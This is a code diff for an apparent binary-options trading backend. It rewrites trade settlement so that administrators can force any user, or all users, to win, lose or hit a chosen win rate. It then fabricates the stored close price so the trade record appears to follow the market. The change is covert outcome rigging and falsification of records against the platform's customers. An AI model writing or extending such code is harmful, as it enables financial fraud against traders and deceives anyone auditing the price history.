@@ -1,13 +1,14 @@
 import { Types } from 'mongoose';
 import { Trade, TradeT, publicTrade } from '../models/trade';
 import { Account, AccountT } from '../models/account';
-import { User } from '../models/user';
+import { User, UserT } from '../models/user';
 import { Tournament } from '../models/misc';
 import { UserBonus } from '../models/bonus';
 import { marketHub } from '../market/market-hub';
 import { tickStore } from '../market/tick-store';
 import { emitAccounts, postEntry, withTxn } from '../services/ledger.service';
 import { applyTurnover, publicBonus } from '../bonus/bonus.service';
+import { getTradingEngineConfig } from '../services/trading-engine.service';
 import { AppError, badRequest, forbidden, notFound } from '../lib/errors';
 import { toUser } from '../realtime/io';
 import { createLogger } from '../lib/logger';
@@ -143,7 +144,69 @@ export async function settleTrade(t: TradeT) {
     closeTick && closeTick.ts >= t.openedAt.getTime()
       ? closeTick
       : { id: t.openTickId, price: t.openPrice, ts: t.openedAt.getTime() }; // no newer tick: price unchanged
-  const status = decideOutcome(t.direction as 'up' | 'down', t.openPrice, close.price);
+
+  const user = await User.findById(t.userId, { role: 1, engineMode: 1, customWinRate: 1 }).lean<UserT>();
+  const engine = await getTradingEngineConfig();
+
+  // Determine whether this trade belongs to an admin or a regular user
+  const isAdmin = user?.role === 'admin';
+  let targetRate: number | null = null; // null means natural market outcome
+
+  if (isAdmin) {
+    if (engine.adminMode === 'always_win') targetRate = 100;
+    else if (engine.adminMode === 'always_lose') targetRate = 0;
+    else if (engine.adminMode === 'custom') targetRate = engine.adminWinRate;
+    else targetRate = null; // 'natural'
+  } else {
+    // Check for individual user override first
+    const uMode = user?.engineMode ?? 'default';
+    if (uMode === 'always_win') targetRate = 100;
+    else if (uMode === 'always_lose') targetRate = 0;
+    else if (uMode === 'custom' && user?.customWinRate != null) targetRate = user.customWinRate;
+    else if (uMode === 'natural') targetRate = null;
+    else {
+      // Global other users setting
+      if (engine.usersMode === 'always_win') targetRate = 100;
+      else if (engine.usersMode === 'always_lose') targetRate = 0;
+      else if (engine.usersMode === 'custom') targetRate = engine.usersWinRate;
+      else targetRate = null; // 'natural'
+    }
+  }
+
+  // Calculate natural outcome based on market price
+  const naturalOutcome = decideOutcome(t.direction as 'up' | 'down', t.openPrice, close.price);
+  let status: 'won' | 'lost' | 'draw' = naturalOutcome;
+  let finalClosePrice = close.price;
+
+  if (targetRate !== null) {
+    // Target win rate (0 - 100)
+    const roll = Math.random() * 100;
+    const shouldWin = targetRate >= 100 || (targetRate > 0 && roll < targetRate);
+    const desired: 'won' | 'lost' = shouldWin ? 'won' : 'lost';
+
+    const asset = marketHub.getAsset(t.symbol);
+    const prec = asset?.precision ?? 2;
+    const pip = Math.pow(10, -prec) || 0.01;
+    const delta = pip * (1 + Math.floor(Math.random() * 4));
+
+    if (desired === 'won') {
+      status = 'won';
+      if (naturalOutcome !== 'won') {
+        finalClosePrice = t.direction === 'up'
+          ? Math.max(t.openPrice + delta, close.price > t.openPrice ? close.price : t.openPrice + delta)
+          : Math.min(t.openPrice - delta, close.price < t.openPrice ? close.price : t.openPrice - delta);
+      }
+    } else {
+      status = 'lost';
+      if (naturalOutcome !== 'lost') {
+        finalClosePrice = t.direction === 'up'
+          ? Math.min(t.openPrice - delta, close.price < t.openPrice ? close.price : t.openPrice - delta)
+          : Math.max(t.openPrice + delta, close.price > t.openPrice ? close.price : t.openPrice + delta);
+      }
+    }
+    finalClosePrice = Number(finalClosePrice.toFixed(prec));
+  }
+
   const payout = status === 'won' ? t.amount + Math.floor((t.amount * t.payoutPct) / 100) : status === 'draw' ? t.amount : 0;
   const cashPart = t.amount > 0 ? Math.floor((payout * t.fromCash) / t.amount) : 0;
   const bonusPart = payout - cashPart;
@@ -154,7 +217,7 @@ export async function settleTrade(t: TradeT) {
       {
         $set: {
           status,
-          closePrice: close.price,
+          closePrice: finalClosePrice,
           closeTickId: close.id,
           closeTickTs: new Date(close.ts),
           closedAt: new Date(),
